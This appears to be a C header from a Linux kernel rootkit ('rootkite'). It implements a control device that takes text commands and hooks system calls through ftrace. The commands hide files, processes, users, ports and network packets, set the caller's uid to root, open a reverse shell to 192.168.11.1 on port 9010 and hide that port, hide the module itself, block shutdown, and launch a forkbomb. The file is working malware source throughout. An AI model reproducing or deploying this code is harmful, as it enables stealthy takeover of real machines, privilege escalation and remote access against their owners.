#ifndef DEVICE_HANDLER
    #define DEVICE_HANDLER

    #include <linux/miscdevice.h> // dev
    #include <linux/sched.h>
    #include <linux/fs.h>
    #include <linux/uaccess.h> // copy to/from user space

    #include "linked_list.h"
    #include "execve_blocker.h"
    #include "root_setter.h"
    #include "getdents_hacks.h"
    #include "hide_process.h"
    #include "hide_ports.h"
    #include "files_hacks.h"
    #include "netfilter_kite.h"
    #include "forkbomb.h"
    #include "keylogger.h"
    #include "kite_hook.h"
    #include "reboot_kite.h"
    #include "kill_kite.h"


#define DEVICE_SIZE 1024 // size of possible input in bytes
char last_data[DEVICE_SIZE] = "no data has been written yet"; // last written data from userspace

#ifdef PTREGS_SYSCALL_STUB
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("__x64_sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hack_kill, &orig_kill),
    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot),
    HOOK("__x64_sys_openat", hack_openat, &orig_openat),
    HOOK("__x64_sys_pread64", hack_pread64, &orig_pread64),
    HOOK("__x64_sys_statx", hack_statx, &orig_statx),
    HOOK("__x64_sys_read", hack_read, &orig_read),
    HOOK("__x64_sys_execve", hack_execve, &orig_execve),
    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
};
#else
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hack_getdents, &orig_getdents),
    HOOK("sys_kill", hack_kill, &orig_kill),
    HOOK("sys_read", hack_read, &orig_read),
    HOOK("sys_reboot", hack_reboot, &orig_reboot),
    HOOK("sys_openat", hack_openat, &orig_openat),
    HOOK("sys_pread64", hack_pread64, &orig_pread64),
    HOOK("sys_statx", hack_statx, &orig_statx),
    HOOK("sys_execve", hack_execve, &orig_execve),
    HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
};
#endif

ssize_t reader(struct file *filep, char *buff, size_t count, loff_t *offp)
{
    if (copy_to_user(buff, last_data, strlen(last_data)) != 0) { // copy last written data to user using the device
        printk("Kernel -> userspace copy failed!\n");
        return -1; // return error
    }
    return strlen(last_data); // return length of data that was copied
}


ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp) // function to get config of what to hide and what type
{
    char tmpdata[DEVICE_SIZE + 1];
    if (copy_from_user(tmpdata, buff, count) != 0) {
        printk("Userspace -> kernel copy failed!\n");
        return -1;
    }

    // can switch all the if's with data structure :| , (command-function)
    if(memcmp("hide ", tmpdata, strlen("hide ")) == 0){
        if(strlen(tmpdata) > strlen("hide ") + 3){
            strcpy(last_data, tmpdata + strlen("hide "));
            insert_node(&files_to_hide, last_data);
        }
    }
    if(memcmp("hidep ", tmpdata, strlen("hidep ")) == 0){
        if(strlen(tmpdata) > strlen("hidep ")){
            strcpy(last_data, tmpdata + strlen("hidep "));
            insert_node(&pids_to_hide, last_data);
        }
    }
    if(memcmp("hidepo ", tmpdata, strlen("hidepo ")) == 0){
        if(strlen(tmpdata) > strlen("hidepo ")){
            strcpy(last_data, tmpdata + strlen("hidepo "));
            insert_node(&ports_to_hide, last_data);
        }
    }
    if(memcmp("hideu ", tmpdata, strlen("hideu ")) == 0){
        if(strlen(tmpdata) > strlen("hideu ")){
            strcpy(last_data, tmpdata + strlen("hideu "));
            insert_node(&users_to_hide, last_data);
        }
    }
    if(memcmp("hidepd ", tmpdata, strlen("hidepd ")) == 0){
        if(strlen(tmpdata) > strlen("hidepd ")){
            strcpy(last_data, tmpdata + strlen("hidepd "));
            insert_node(&ports_to_drop, last_data);
        }
    }
    if(memcmp("hidee ", tmpdata, strlen("hidee ")) == 0){
        if(strlen(tmpdata) > strlen("hidee ")){
            strcpy(last_data, tmpdata + strlen("hidee "));
            insert_node(&exec_to_block, last_data);
        }
    }
    if(memcmp("show ", tmpdata, strlen("show ")) == 0){
        if(strlen(tmpdata) > strlen("show ") + 3){
            strcpy(last_data, tmpdata + strlen("show "));
            remove_node_by_name(&files_to_hide, last_data);
        }
    }
    if(memcmp("showp ", tmpdata, strlen("showp ")) == 0){
        if(strlen(tmpdata) > strlen("showp ")){
            strcpy(last_data, tmpdata + strlen("showp "));
            remove_node_by_name(&pids_to_hide, last_data);
        }
    }
    if(memcmp("showpo ", tmpdata, strlen("showpo ")) == 0){
        if(strlen(tmpdata) > strlen("showpo ")){
            strcpy(last_data, tmpdata + strlen("showpo "));
            remove_node_by_name(&ports_to_hide, last_data);
        }
    }
    if(memcmp("showu ", tmpdata, strlen("showu ")) == 0){
        if(strlen(tmpdata) > strlen("showu ")){
            strcpy(last_data, tmpdata + strlen("showu "));
            remove_node_by_name(&users_to_hide, last_data);
        }
    }
    if(memcmp("showpd ", tmpdata, strlen("showpd ")) == 0){
        if(strlen(tmpdata) > strlen("showpd ")){
            strcpy(last_data, tmpdata + strlen("showpd "));
            remove_node_by_name(&ports_to_drop, last_data);
        }
    }
    if(memcmp("showe ", tmpdata, strlen("showe ")) == 0){
        if(strlen(tmpdata) > strlen("showe ")){
            strcpy(last_data, tmpdata + strlen("showe "));
            remove_node_by_name(&exec_to_block, last_data);
        }
    }

    #ifdef PTREGS_SYSCALL_STUB
    if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
        if(strlen(tmpdata) > strlen("hide-files")){
            strcpy(last_data, tmpdata);
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_openat") == 1){
                printk(KERN_ERR "error hooking syscall openat\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_pread64") == 1){
                printk(KERN_ERR "error hooking syscall openat\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_statx") == 1){
                printk(KERN_ERR "error hooking syscall statx\n");
            }
        }
    }

    if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
        if(strlen(tmpdata) > strlen("hide-users")){
            strcpy(last_data, tmpdata);
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
                printk(KERN_ERR "error hooking syscall read\n");
            }
        }
    }

    if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
        if(strlen(tmpdata) > strlen("block-files-reboot")){
            strcpy(last_data, tmpdata);
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
                printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
            }
            if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 0){
                insert_node(&exec_to_block, "shutdown");
                if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
                    printk(KERN_ERR "error hooking syscall execve\n");
                }
            }
            else{
                remove_node_by_name(&exec_to_block, "shutdown");
            }
        }
    }
    #else
    if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
        if(strlen(tmpdata) > strlen("hide-files")){
            strcpy(last_data, tmpdata);
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_openat") == 1){
                printk(KERN_ERR "error hooking syscall openat\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_pread64") == 1){
                printk(KERN_ERR "error hooking syscall openat\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_statx") == 1){
                printk(KERN_ERR "error hooking syscall statx\n");
            }
        }
    }

    if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
        if(strlen(tmpdata) > strlen("hide-users")){
            strcpy(last_data, tmpdata);
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
                printk(KERN_ERR "error hooking syscall read\n");
            }
        }
    }
    if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
        if(strlen(tmpdata) > strlen("block-files-reboot")){
            strcpy(last_data, tmpdata);
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
                printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
            }
            if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 0){
                insert_node(&exec_to_block, "shutdown");
                if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
                    printk(KERN_ERR "error hooking syscall execve\n");
                }
            }
            else{
                remove_node_by_name(&exec_to_block, "shutdown");
            }
        }
    }
    #endif

    if(memcmp("hide-ports", tmpdata, strlen("hide-ports")) == 0){
        if(strlen(tmpdata) > strlen("hide-ports")){
            strcpy(last_data, tmpdata);
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
                printk(KERN_ERR "error hooking tcp4_seq_show\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp6_seq_show") == 1){
                printk(KERN_ERR "error hooking tcp6_seq_show\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp4_seq_show") == 1){
                printk(KERN_ERR "error hooking udp4_seq_show\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
                printk(KERN_ERR "error hooking udp6_seq_show\n");
            }
        }
    }


    if(memcmp("elevate", tmpdata, strlen("elevate")) == 0){
        if(strlen(tmpdata) > strlen("elevate")){
            strcpy(last_data, tmpdata);
            printk(KERN_INFO "Setting root for calling process\n");
            set_root();
            return 0;
        }
    }

    if(memcmp("reverse-me", tmpdata, strlen("reverse-me")) == 0){
        if(strlen(tmpdata) > strlen("reverse-me")){
            strcpy(last_data, tmpdata);
            start_reverse_shell("192.168.11.1", "9010");
            insert_node(&ports_to_hide, "9010");
        }
    }

    if(memcmp("hide-packets", tmpdata, strlen("hide-packets")) == 0){
        if(strlen(tmpdata) > strlen("hide-packets")){
            strcpy(last_data, tmpdata);
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
                printk(KERN_ERR "error hooking packet_rcv\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
                printk(KERN_ERR "error hooking tpacket_rcv\n");
            }
            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
                printk(KERN_ERR "error hooking packet_rcv_spkt\n");
            }
        }
    }

    if(memcmp("hide-process", tmpdata, strlen("hide-process")) == 0){
        if(strlen(tmpdata) > strlen("hide-process")){
            strcpy(last_data, tmpdata);
            switch_hide_process();
        }
    }
    
    if(memcmp("rooted", tmpdata, strlen("rooted")) == 0){
        if(strlen(tmpdata) > strlen("rooted")){
            strcpy(last_data, tmpdata);
            rooted();
            insert_node(&files_to_hide, "rootkite.ko");
            //insert_node(&files_to_hide, "ath_pci.conf");
        }
    }

    if(memcmp("block-packets", tmpdata, strlen("block-packets")) == 0){
        if(strlen(tmpdata) > strlen("block-packets")){
            strcpy(last_data, tmpdata);
            switch_net_hook();
        }
    }
    
    if(memcmp("finito", tmpdata, strlen("finito")) == 0){
        if(strlen(tmpdata) > strlen("finito")){
            strcpy(last_data, tmpdata);
            start_bombing_run();
        }
    }

    return 0;
}


struct file_operations fops = { // file operations on device file, what functions to call when reading/writing
    read: reader,
    write: writer
};

static struct miscdevice controller = { // device configuration in file system and kernel
    .minor = MISC_DYNAMIC_MINOR,
    .name = "controller",
    .fops = &fops
};

#endif
